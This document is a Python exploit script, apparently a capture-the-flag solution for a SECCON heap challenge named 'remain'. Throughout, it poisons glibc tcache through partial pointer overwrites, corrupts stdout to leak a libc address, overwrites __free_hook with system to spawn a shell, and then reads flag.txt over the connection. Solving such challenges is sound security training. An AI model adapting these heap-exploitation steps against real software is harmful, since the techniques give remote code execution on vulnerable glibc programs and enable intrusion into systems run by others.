#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import os

bin_file = './remain'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

default_host = {'host':'target', 'port':4296}

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':['./ld.so', '--library-path', '.', bin_file]}, \
                        remote  = default_host, \
                        monitor = {'host':os.environ['SECCON_HOST'], 'port':int(os.environ['SECCON_PORT'])} if 'SECCON_HOST' in os.environ else default_host)
env.set_item('libc',    debug   = None, \
                        local   = 'libc.so.6', \
                        remote  = 'libc.so.6', \
                        monitor = 'libc.so.6')
env.select('monitor')


#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_io_stdfile_lock = libc.symbols['_IO_stdfile_1_lock']

#==========

def attack(conn):
    rm = Remain(conn)

    rm.add('a'*8)                   # 0
    rm.add('b'*8)                   # 1
    rm.add('c'*0x38+'\x11')         # 2

    rm.delete(2)
    rm.delete(0)
    rm.delete(1)
    rm.edit(1, '\xa8')              # heap partial

    rm.add('B'*8)                   # 3 (= 1)
    rm.add('A'*0x40+chr(0x91))      # 4 (= 0 + 0x8)
    rm.add(p64(0)+p64(0xff<<8*6))   # 5, fake tcache counts

    rm.delete(1)
    rm.edit(1, '\xc8\xe6')          # stdout._IO_write_ptr

    rm.delete(0)
    rm.edit(4, '\x00')              # break key
    rm.delete(0)
    rm.edit(4, '\x00')              # break key
    rm.delete(0)
    rm.edit(0, '\xf0')

    rm.add('a'*8)                   # 6 (= 0)
    rm.add('b'*8)                   # 7 (= 1)
    rm.add('\xff')                  # 8, overwrite _IO_write_ptr

    conn.recv(5)
    addr_libc_io_stdfile_lock = u64(conn.recv(8))
    libc.address = addr_libc_io_stdfile_lock - offset_libc_io_stdfile_lock
    if libc.address & 0xfff:
        raise
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_free_hook = libc.symbols['__free_hook']

    rm.delete(0)
    rm.edit(4, '\x00')              # break key
    rm.delete(0)
    rm.edit(0, p64(addr_libc_free_hook - 8)[:6])

    rm.add('a'*8)                   # 9 (= 0)
    rm.add('/bin/sh\x00' + p64(addr_libc_system))
 
class Remain:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, data):
        self.sendlineafter('> ', '1')
        self.sendafter('memo > ', data)

    def edit(self, idx, data):
        self.sendlineafter('> ', '2')
        self.sendlineafter('id > ', str(idx))
        self.sendafter('memo > ', data)

    def delete(self, idx):
        self.sendlineafter('> ', '3')
        self.sendlineafter('id > ', str(idx))

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline('exec 2>&1')
    sleep(0.1)
    conn.sendline('echo FLAG_HERE; cat flag.txt')
    conn.recvuntil('FLAG_HERE\n')
    print 'FLAG : %s' % conn.recvuntil('\n', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.connection.interactive()
 
#==========
